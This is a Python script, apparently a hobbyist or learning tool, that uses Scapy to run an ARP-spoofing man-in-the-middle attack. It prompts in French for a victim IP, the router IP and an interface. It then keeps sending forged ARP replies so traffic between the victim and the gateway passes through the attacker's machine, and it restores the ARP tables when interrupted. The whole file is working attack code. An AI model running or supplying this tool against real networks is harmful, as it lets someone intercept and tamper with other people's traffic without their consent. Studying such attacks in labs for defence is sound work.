#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import re
import subprocess


def get_my_mac(interface):
    ifconfig_result = subprocess.check_output(['ifconfig', interface], encoding='utf-8')
    mac_adress_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
    if mac_adress_search_result:
        return mac_adress_search_result.group(0)
    else:
        raise IndexError('[-] Unable to get the Mac adress.')


def get_mac(ip):
    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=ip)
    # srp pour l'envoie avec réponse
    answer_list = srp(arppacket, timeout=2, verbose=False)[0]
    return answer_list[0][1].hwsrc


def spoof_arp(targetip, targetmac, sourceip):
    # op 2-> is at
    arp_spoof = ARP(op=2, pdst=targetip, hwsrc=targetmac, psrc=sourceip)
    send(arp_spoof, verbose=False)


def restore_arp(targetip, targetmac, sourceip, sourcemac):
    restorepkt = ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=sourceip, hwsrc=sourcemac)
    send(restorepkt, verbose=False)


def main():
    target_ip = input('Entrer l\'ip de la victime: ')
    gateway_ip = input('Entrer l\'ip du routeur: ')
    hack_interface = input('Entrer votre interface: ')

    try:
        mac_victim = get_mac(target_ip)
        print(f'Target Mac ===> {mac_victim}')
    except:
        print('No response from target victim')
        quit()

    try:
        mac_gateway = get_mac(gateway_ip)
        print(f'[+] Gateway Mac ===> {mac_gateway}')
    except:
        print('Gateway is unreachable')
        quit()

    try:
        hacker_mac = get_my_mac(hack_interface)
        print('[+] Your current mac adress is : ' + hacker_mac)
    except IndexError as error:
        print(error)

    try:
        send_packet_count = 0
        # echo 1 > /proc/sys/net/ipv4/ip_forward
        while True:
            spoof_arp(target_ip, hacker_mac, gateway_ip)
            spoof_arp(gateway_ip, hacker_mac, target_ip)
            send_packet_count += 2
            print(f'\rSent packets : {str(send_packet_count)}',end="")

            time.sleep(2)

    except KeyboardInterrupt:
        print(' \n [-]Keyboard Interruption :   Arpspoof stopped')
        restore_arp(target_ip, mac_victim, gateway_ip, mac_gateway)
        restore_arp(gateway_ip, mac_gateway, target_ip, mac_victim)
        quit()


if __name__ == "__main__":
    main()
